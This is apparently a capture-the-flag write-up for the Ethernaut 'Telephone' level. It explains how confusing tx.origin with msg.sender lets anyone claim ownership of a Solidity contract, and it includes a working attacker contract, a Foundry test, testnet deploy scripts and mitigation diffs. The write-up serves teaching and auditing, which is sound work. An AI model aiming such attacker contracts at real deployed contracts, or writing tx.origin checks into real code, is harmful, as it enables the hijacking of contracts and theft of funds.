# Level 4: Telephone

**Level Page**: [See on Ethernaut](https://ethernaut.openzeppelin.com/level/0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446)

**Description**:

Claim ownership of the contract below to complete this level.

`Description after completing the level`:

While this example may be simple, confusing `tx.origin` with `msg.sender` can lead to phishing-style attacks, such as [this](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks).

An example of a possible attack is outlined below.

1. Use `tx.origin` to determine whose tokens to transfer, e.g.

```javascript
function transfer(address _to, uint _value) {
  tokens[tx.origin] -= _value;
  tokens[_to] += _value;
}
```

2. Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.

```javascript
function () payable {
  token.transfer(attackerAddress, 10000);
}
```

In this scenario, `tx.origin` will be the victim's address (while `msg.sender` will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.


**Code**:

<details>
<summary>See Code</summary>

Code to be exploited:

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

</details>

# Findings

### [H-1] Use of `tx.origin` allow anyone to claim contract ownership

**Description**: `tx.origin` is used to reference who was the first caller of a function sequence call. A good example from [Solidity docs](https://solidity-by-example.org/hacks/phishing-with-tx-origin/) is: "If contract A calls B, and B calls C, in C `msg.sender` is B and `tx.origin` is A.". So the `msg.sender` refer to the last function address caller.

```javascript
  function changeOwner(address _owner) public {
@>    if (tx.origin != msg.sender) {
          owner = _owner;
      }
  }
```

**Impact**: Allow anyone to claim contract ownership and perform functions that should be protected.

**Proof of Code**: In order to exploit this vulnerability we need to create another contract. In this case, it was created the `TelephoneAttacker.sol`.

<details>
<summary>See TelephoneAttacker Code</summary>

In this case, when the attacker calls `TelephoneAttacker::attack` function, it becomes the `Telephone::tx.origin`, because was the first caller. And as the `TelephoneAttacker` calls `Telephone::changeOwner`, `TelephoneAttacker` becomes the `Telephone::msg.sender`. The sequence is like:

`attacker address` -> `TelephoneAttacker` -> `Telephone`

```javascript
// SPDX-License-Identifier: MIT
  pragma solidity ^0.8.0;

  import {Telephone} from "./Telephone.sol";

  contract TelephoneAttacker {
    Telephone telephone;
    address owner;

    constructor(address _telephoneAddress) {
      telephone = Telephone(_telephoneAddress);
      owner = msg.sender;
    }

    function attack() external{
      telephone.changeOwner(owner);
    }
  }
```
</details>

<details>
<summary>See Test Code</summary>

Test code from `TelephoneAttack.t.sol`.

```javascript
  function testShouldClaimOwnership() public{
    assertEq(telephone.owner(), address(this));
    
    vm.prank(attacker);
    telephoneAttacker.attack();

    assertEq(telephone.owner(), attacker);
  }
```
</details>

**Recommended Mitigation**: Instead of using `tx.origin` try using only `msg.sender` and the `owner` variable in the condition:

```diff
  function changeOwner(address _owner) public {
-    if (tx.origin != msg.sender) {
+    if (msg.sender == owner) {
        owner = _owner;
    }
  }
```

The thing is, if the address who executed this function was not the owner, it would still spend some gas. To avoid this, we could use `require`:

```diff
  function changeOwner(address _owner) public {
-    if (tx.origin != msg.sender) {
-       owner = _owner;
-    }
+    require(msg.sender == owner);
+    owner = _owner;
  }
```

Or we could even create a `modifier` and reuse it in any other function that needs this protection:

```diff
+  modifier onlyOwner() {
+     require(msg.sender == owner, "caller is not the owner");
+     _;
+  }

-  function changeOwner(address _owner) public {
-    if (tx.origin != msg.sender) {
-       owner = _owner;
-    }
+  function changeOwner(address _owner) public onlyOwner {
+    owner = _owner;
   }
```

# Attack

**Description**: To exploit this contract we just need to: 

1. Deploy the `TelephoneAttacker` using the `TelephoneAttackerDeploy.s.sol` (`make deploy`)
2. Run the attack by calling the `TelephoneAttacker::attack` using the `TelephoneAttack.s.sol` (`make attack`)

```javascript
  // TelephoneAttack.s.sol

  vm.startBroadcast(attackerPK);

  // Attack
  telephoneAttacker.attack();

  vm.stopBroadcast();
```

3. Submit the level `make submit`.

**Instance used**: [0x520d85a25A9b14Eeb3Fa3d1eceE88B98882eB8b5](https://sepolia.etherscan.io/address/0x520d85a25A9b14Eeb3Fa3d1eceE88B98882eB8b5)

**Attacker Contract**: [0x82E69EBbD5f4D3822a252060932fe6661D4A6b4b](https://sepolia.etherscan.io/address/0x82E69EBbD5f4D3822a252060932fe6661D4A6b4b)

**Attack Transaction**: [see on etherscan](https://sepolia.etherscan.io/tx/0x583b596d2862582d55eb43be989d56f4493a168fdcb0370e77d9cc4b9f33e30d)

**Level Completed Transaction**: [see on etherscan](https://sepolia.etherscan.io/tx/0x38a4e8b07fa3048796d290ef61bfbeca6702a036235a1090ddd290f9abfb0280)

# Getting started

## Build

```bash
make build
```

## Test

```bash
make test
```

## Deploy Attacker contract (testnet)

```bash
make deploy
```

## Attack (testnet)

```bash
make attack
```

## Submit level (testnet)

```bash
make submit
```

## Check if you completed the level (testnet)

`true` - You completed the level
`false` - You didn't complete the level

```bash
make check
```